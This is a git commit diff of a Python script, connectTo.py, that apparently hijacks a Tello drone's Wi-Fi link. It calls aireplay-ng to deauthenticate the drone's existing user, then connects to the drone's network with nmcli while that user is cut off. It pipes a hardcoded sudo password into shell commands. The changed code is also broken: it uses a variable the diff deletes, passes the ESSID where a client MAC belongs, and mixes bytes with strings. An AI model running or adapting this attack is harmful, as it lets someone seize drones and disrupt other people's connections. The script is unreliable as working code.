e33f115d67d313f863241bdd329ce9022ff15d6f
MDecarabas <72196105+MDecarabas@users.noreply.github.com>
2022-03-21 09:44:36 -0500

    Uploaded to git connectTo drone script

--- connectTo.py
+++ connectTo.py
@@ -1,21 +1,19 @@
 import subprocess
-import json;
+import json
+import argparse
 
 flag = 1
-# 34-D2-62 Tello Chain
-wpaInfo = '{"ssid": "Cheerio", "password": "123456789"}'
 
 while(flag == 1):
 
-    
+    drone = json.loads(wpaInfo) # load in wpa info from csv2json
 
-    drone = json.loads(wpaInfo)
-
-    myPass = 'kali' #or get the password from anywhere
+    myPass = 'kali' #password used to execute sudo command
 
     subprocess.call(["nmcli", "radio", "wifi", "on"])
 
-    cmd = "ip link set wlan0 down"
+#setting wifi into monitor mode
+    cmd = "ip link set wlan0 down" 
 
     linkDown = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)
 
@@ -25,13 +23,16 @@ while(flag == 1):
 
     cmd = "ip link set wlan0 up"
 
+# Executing deauth of external user
     linkUp = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)
 
-    cmd = "aireplay-ng -0 10 -a 34:D2:62:EE:7A:20 -c 00:0F:B5:FD:FB:C2 wlan1"
+# Deauth User
+    cmd = "aireplay-ng -0 10 -a " + drone["Bssid"] + " -c " + drone["Essid"] + " wlan1"
 
     deAuth = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)
 
-    cmd = "sudo nmcli dev wifi connect " + drone["ssid"] + " password " + drone["password"]
+# Connect to wifi while external user is deauthorized
+    cmd = "sudo nmcli dev wifi connect " + drone["Essid"] + " password " + drone["password"]
 
     # cmd = "sudo nmcli dev wifi connect TELLO-EE7A20" # Hardcoded test value
 
@@ -41,5 +42,7 @@ while(flag == 1):
 
     # print("Signal of drone named "+drone["ssid"]+" not found")
 
-    if(err != b"Error: No network with SSID 'Cheerio' found.\n"):
+    error = b"Error: No network with SSID" + drone["Essid"] + "found.\n"
+    if(err != error):
+
         flag = 0
